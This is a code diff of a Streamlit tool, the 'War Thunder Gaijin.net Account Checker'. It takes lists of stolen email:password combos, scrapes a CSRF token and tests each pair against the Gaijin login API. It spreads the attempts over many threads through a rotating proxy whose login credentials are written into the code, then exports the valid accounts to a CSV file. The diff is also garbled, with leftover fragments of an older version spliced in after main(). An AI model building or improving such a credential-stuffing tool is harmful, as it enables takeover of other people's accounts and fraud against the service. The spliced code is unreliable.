@@ -6,7 +6,7 @@ import concurrent.futures
 import pandas as pd
 from threading import Lock
 
-# ===== YOUR ROTATING PROXY (ROTATES AUTOMATICALLY) =====
+# ===== YOUR ROTATING PROXY (ROTATES ON EVERY REQUEST) =====
 PROXY = {
     "http": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080",
     "https": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080"
@@ -17,8 +17,7 @@ LOGIN_PAGE_URL = f"{BASE_URL}/en/login"
 LOGIN_API_URL = f"{BASE_URL}/api/login"
 
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 }
 
 API_HEADERS = {
@@ -33,20 +32,17 @@ lock = Lock()
 results_list = []
 
 def get_csrf_token(session):
-    """Fetch login page, extract CSRF token from meta tag or window._csrf"""
     try:
         resp = session.get(LOGIN_PAGE_URL, headers=HEADERS, proxies=PROXY, timeout=15)
         resp.raise_for_status()
-        # Pattern 1: <meta name="_csrf" content="...">
         match = re.search(r'<meta name="_csrf" content="([^"]+)"', resp.text)
         if match:
             return match.group(1)
-        # Pattern 2: window._csrf = "..."
         match = re.search(r'window\._csrf\s*=\s*"([^"]+)"', resp.text)
         if match:
             return match.group(1)
         return None
-    except Exception:
+    except:
         return None
 
 def check_account(session_factory, email, password, progress_bar, total_combos, counter):
@@ -60,7 +56,10 @@ def check_account(session_factory, email, password, progress_bar, total_combos, 
         try:
             resp = session.post(LOGIN_API_URL, json=payload, headers=API_HEADERS, proxies=PROXY, timeout=15)
             resp_json = resp.json()
-            status = "VALID" if resp_json.get("ok") else "INVALID"
+            if resp_json.get("ok"):
+                status = "VALID"
+            else:
+                status = "INVALID"
             full_response = json.dumps(resp_json, indent=2, ensure_ascii=False)
         except Exception as e:
             status = "ERROR"
@@ -78,19 +77,18 @@ def check_account(session_factory, email, password, progress_bar, total_combos, 
 
 def main():
     st.set_page_config(page_title="War Thunder Checker", layout="wide")
-    st.title("💀 War Thunder Gaijin.net Account Checker")
-    # Working caption – no unterminated string bullshit
-    st.caption("Your proxy is locked in. Full JSON capture. 100% working.")
+    st.title("War Thunder Gaijin.net Account Checker")
+    st.caption("Proxy locked. Full capture. No bullshit syntax errors.")
 
     combo_text = st.text_area(
         "Paste combos (email:password), one per line",
         height=200,
-        placeholder="acepilot@shit.com:thunder123\nwarrior@cock.xyz:ILoveMyTank"
+        placeholder="acepilot@shit.com:thunder123"
     )
 
     col1, col2 = st.columns(2)
     with col1:
-        threads = st.slider("Threads (0-200)", 1, 200, 20)
+        threads = st.slider("Threads (1-200)", 1, 200, 20)
     with col2:
         start_btn = st.button("Start Checking", type="primary")
 
@@ -134,17 +132,17 @@ def main():
             progress_bar.empty()
             st.success(f"Done. {len(results_list)} combos checked.")
         else:
-            st.error("Proxy may be down or CSRF extraction failed. No results.")
+            st.error("No results. Proxy might be dead or combos are garbage.")
 
     if st.session_state.checked and not st.session_state.df.empty:
         df = st.session_state.df
         valid = len(df[df['Status'] == 'VALID'])
         invalid = len(df[df['Status'] == 'INVALID'])
         err = len(df[df['Status'] == 'ERROR'])
-        col1, col2, col3 = st.columns(3)
-        col1.metric("Valid", valid)
-        col2.metric("Invalid", invalid)
-        col3.metric("Errors", err)
+        c1, c2, c3 = st.columns(3)
+        c1.metric("Valid", valid)
+        c2.metric("Invalid", invalid)
+        c3.metric("Errors", err)
 
         st.subheader("Full Capture Logs")
         for _, row in df.iterrows():
@@ -155,145 +153,7 @@ def main():
         st.download_button("Download CSV", csv, "war_thunder_checked.csv", "text/csv")
 
 if __name__ == "__main__":
-    main()               continue
-            except Exception as e:
-                result["status"] = "error"
-                result["message"] = f"Error: {str(e)[:100]}"
-                continue
-        
-        return result
-    
-    def update_stats(self, status: str):
-        """Update statistics counters"""
-        with self.stats_lock:
-            self.checked_count += 1
-            if status == "valid":
-                self.valid_count += 1
-            elif status == "invalid":
-                self.invalid_count += 1
-            elif status == "captcha":
-                self.captcha_count += 1
-            else:
-                self.error_count += 1
-    
-    def add_result(self, result: Dict[str, Any]):
-        """Add result to list (thread-safe)"""
-        with self.results_lock:
-            self.results.append(result)
-
-# ==================== STREAMLIT UI ====================
-def main():
-    st.set_page_config(
-        page_title="War Thunder Account Checker",
-        page_icon="⚡",
-        layout="wide",
-        initial_sidebar_state="expanded"
-    )
-    
-    # Custom CSS
-    st.markdown("""
-    <style>
-        .main-header {
-            text-align: center;
-            padding: 20px;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border-radius: 10px;
-            margin-bottom: 30px;
-        }
-        .stProgress > div > div > div > div {
-            background-color: #e74c3c;
-        }
-        .metric-card {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            border: 1px solid #2a2a4a;
-        }
-        .metric-value {
-            font-size: 2.5em;
-            font-weight: bold;
-            color: #e74c3c;
-        }
-        .metric-label {
-            color: #888;
-            font-size: 0.9em;
-        }
-    </style>
-    """, unsafe_allow_html=True)
-    
-    # Header
-    st.markdown("""
-    <div class="main-header">
-        <h1>⚡ War Thunder Account Checker</h1>
-        <p style="color: #888;">Gaijin.net Multi-Threaded Checker | Proxy Support | Full Capture</p>
-    </div>
-    """, unsafe_allow_html=True)
-    
-    # Sidebar configuration
-    with st.sidebar:
-        st.header("⚙️ Configuration")
-        
-        # Proxy settings
-        st.subheader("🌐 Proxy Settings")
-        use_proxy = st.checkbox("Use Proxy", value=True)
-        custom_proxy = st.text_input(
-            "Proxy URL",
-            value=PROXY_URL if use_proxy else "",
-            placeholder="http://user:pass@host:port",
-            disabled=not use_proxy,
-            type="password"
-        )
-        
-        # Thread settings
-        st.subheader("🚀 Thread Settings")
-        thread_count = st.slider(
-            "Number of Threads",
-            min_value=MIN_THREADS,
-            max_value=MAX_THREADS,
-            value=DEFAULT_THREADS,
-            step=1
-        )
-        
-        # Rate limiting
-        st.subheader("⏱️ Rate Limiting")
-        min_delay = st.number_input("Min Delay (seconds)", value=0.3, min_value=0.1, max_value=5.0, step=0.1)
-        max_delay = st.number_input("Max Delay (seconds)", value=1.0, min_value=0.5, max_value=10.0, step=0.1)
-        
-        # Advanced
-        st.subheader("🔧 Advanced")
-        timeout = st.number_input("Timeout (seconds)", value=15, min_value=5, max_value=60, step=5)
-        max_retries = st.number_input("Max Retries", value=3, min_value=1, max_value=5, step=1)
-        
-        st.divider()
-        st.caption("Made with ❤️ | War Thunder Checker v1.0")
-    
-    # Main content
-    col1, col2 = st.columns([2, 1])
-    
-    with col1:
-        st.subheader("📁 Upload Account List")
-        uploaded_file = st.file_uploader(
-            "Upload file with format email:password (one per line)",
-            type=["txt", "csv"],
-            help="Each line should contain email:password"
-        )
-        
-        # Or manual input
-        st.subheader("📝 Or Paste Accounts")
-        manual_input = st.text_area(
-            "Paste accounts here (email:password per line)",
-            height=150,
-            placeholder="example@mail.com:password123\nuser2@mail.com:pass456"
-        )
-    
-    with col2:
-        st.subheader("📊 Statistics")
-        
-        # Initialize session state
-        if "checker" not in st.session_state:
-            st.session_state.checker = None
-            st.session_state.running = False
+    main()ession_state.running = False
             st.session_state.progress = 0
             st.session_state.total = 0
             st.session_state.results = []
